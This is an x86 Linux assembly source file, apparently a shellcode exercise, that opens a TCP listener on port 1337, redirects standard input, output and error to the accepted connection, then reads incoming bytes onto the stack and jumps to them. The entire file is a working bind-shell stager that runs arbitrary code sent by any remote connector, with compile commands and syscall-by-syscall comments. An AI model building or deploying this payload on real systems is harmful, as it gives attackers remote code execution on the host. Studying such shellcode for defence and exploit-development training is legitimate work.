; Filename: tcp_bind_shell.nasm
; Author:  Plaix
; Website:  http://slacklabs.be
;
; Purpose: 
; Bind on configurable port and reads/runs shellcode upon connect

; Compile:
; --------
;
; nasm -f elf32 -o tcp_bind_shell.o portbind.nasm
; ld -o tcp_bind_shell portbind.o




global _start			

section .text
_start:
	; set up socket ( 0x66 ) , save FD
	; socketcall syscall 102
	; int socketcall(int call, unsigned long *args)
	;    call= ebx 
        ;	0x01 = SYS_SOCKET
	;	defined in linux/net.h
	;	long *args = socket call
	; int socket(int domain, int type, int protocol);
	;            PF_INET=2,SOCK_STREAM=1,0

	; play nice
	;pushad
	; clear out the regs
	xor ecx,ecx
	mul ecx

_socket:
	mov byte al,0x66 ; 102
	inc ebx ; 0x01 SYS_SOCKET
	push ecx ; 0x00 = int protocol of socket args list
	push byte 0x01 ; 0x01 = int type = SOCK_STREAM
	push byte 0x02 ; = int domain = AF_INET
	mov ecx,esp
	int 0x80	
	; save fd
	xchg esi,eax
	
_bind:	
	; http://man7.org/linux/man-pages/man2/bind.2.html
	; int socketcall(int call, unsigned long *args)
	; call = 0x02 
	; int bind(int sockfd, const struct sockaddr *addr,
	;				 socklen_t addrlen);	
	pop ebx ; 0x02 int call > bind 

	; create struct sockaddr	
	push edx ; 0x0
	; use port 1337
	; TCP/IP works on big endian order
	; least significant bit to the right
	; this will push the 2 byte port and the following 
	; push word bx will push 2 bytes on the stack
	; making the dword to be used in the struct for port
	; 3905000002 
	push word 0x3905 ; port 1337
			
	push word bx ; AF_INET = 2 
	mov ecx,esp ; save pointer

	push byte 0x10 ; addrlen = 16
	push ecx ; struct sockaddr
	push esi ; sockfd
	mov ecx,esp ; save pointer to bind argument lists
	push byte 0x66 ; 102 socket syscall
	pop eax
	int 0x80


_listen:	

	; int socketcall(int call, unsigned long *args)
	; call = 0x04
	inc ebx
	inc ebx
	;int listen(int sockfd, int backlog);
	push edx ; 0x0
	push esi ; socketfd
	mov ecx,esp
	mov byte al,0x66 ; 102 socket syscall
	int 0x80
	
_accept:

	; int socketcall(int call, unsigned long *args)
	; call = 0x05
	inc ebx
	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
	; esi , 0 , 0 
	push edx ; 0x0
	push edx ; 0x0
	push esi ; sockfd
	mov ecx,esp
	mov byte al,0x66 ; 102 socket syscall
	int 0x80



_dup2:
	; duplicate stdErr(2),stdOut(1) and stdIn(0) so the socket can interact with execve spawned binary later on
	; int dup2(int oldfd, int newfd); 
	; ecx is prepped to loop and decrease by one until signed flag is set
	; this will be set if ecx goes to -1 and allows us to loop past 0
	
	; stack contains 0x3 at this point = socketFD, change if needed
	pop ecx  
	dec ecx
	xchg ebx,eax ; sockFD of new client socket! Result of accept call
loop:
	mov byte al,0x3f ; dup2 syscall
	int 0x80
	dec ecx
	jns loop
	

_readrun:
	; reads input upon connect and jump to it to run
	; read syscall
	mov byte al,0x03
	mov ecx,esp
	mov byte dl,0x7ff
	inc edx
	int 0x80
	jmp ecx
